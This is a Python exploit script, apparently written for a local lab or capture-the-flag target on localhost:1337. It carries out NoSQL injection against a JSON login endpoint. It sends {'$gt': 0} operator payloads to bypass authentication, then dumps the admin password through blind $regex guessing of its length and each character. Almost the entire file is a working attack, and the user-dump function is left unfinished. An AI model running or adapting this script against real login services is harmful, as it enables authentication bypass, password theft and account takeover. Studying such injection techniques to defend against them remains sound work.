# coding=utf-8
import json

import requests

method = 'http://'
base_url = 'localhost'
port = '1337'
path = '/api/users/login'
payload_type = 'json'
parameters = ['user', 'pass']
payloads = [{'$gt': 0}]
chars = 'abcdefghijklmnñopqrstuvwxyzABCDEFGHIJKLMNÑOPQRSTUVWXYZ !"#$%&\'()*+,-./:;<=>?@[\]^_`{|}~'


# For burp
def get_proxies(host='127.0.0.1', port='8080'):
   # proxies = {
   #     'http': 'http://%s:%s' % (host, port),
   #     'https': 'https://%s:%s' % (host, port)
   # }
   # return proxies
   return None


# Generate payload
def generatedata(parameters, values):
   aux = {}
   if len(parameters) == len(values):
       for j in range(0, len(parameters)):
           aux[parameters[j]] = values[j]
   return aux


# Check if request worked
def is_valid(result):
   if result.status_code == 200:
       content = result.json()
       if content['sucess']:
           return True
   return False


def inject_payload(payload):
   return is_valid(requests.post(
       method + base_url + ':' + port + path,
       headers={'content-type': 'application/json'},
       data=json.dumps(payload),
       proxies=get_proxies(),
       verify=False
   ))


# Check if injection is working
def check_injection(parameters, original_values):
   orig = generatedata(parameters, original_values)
   print('Testing NOSQL inyection...')

   for p in parameters:
       payload = orig.copy()
       payload[p] = payloads[0]
       valid = inject_payload(payload)
       if valid:
           print('  - Seems that parameter: <' + p + '> IS vulnerable')
       else:
           print('  - Seems that parameter: <' + p + '> IS NOT vulnerable')


# Dump user password
def dump_password(user):
   orig = {'user': user, 'pass': 'admin'}
   print('Trying to dump ' + user + ' password')

   exit = False
   length = 1
   password = ''
   while not exit:
       payload = orig.copy()
       payload['pass'] = {"$regex": '^' + '.' * length + '$'}
       if inject_payload(payload):
           exit = True
       else:
           length += 1

   print('  - Password length: ' + str(length))

   for i in range(0, length):
       payload = orig.copy()
       for c in chars:
           payload['pass'] = {"$regex": '^' + password + c + '.' * (length-1) + '$'}
           if inject_payload(payload):
               password += c
               length -= 1
               break

   print('  - Password cracked: ' + password)
   return password

def dump_users():
   orig = {'user': "asdf", 'pass': {"$gt": 0}}
   print('Trying to dump users')

if __name__ == '__main__':
   # data = generatedata(parameters, ['admin', 'admin'])
   # r = requests.post(method + base_url + ':' + port + path, data=data)
   # print(is_valid(r))
   check_injection(parameters, ['admin', 'admin'])
   dump_password('admin')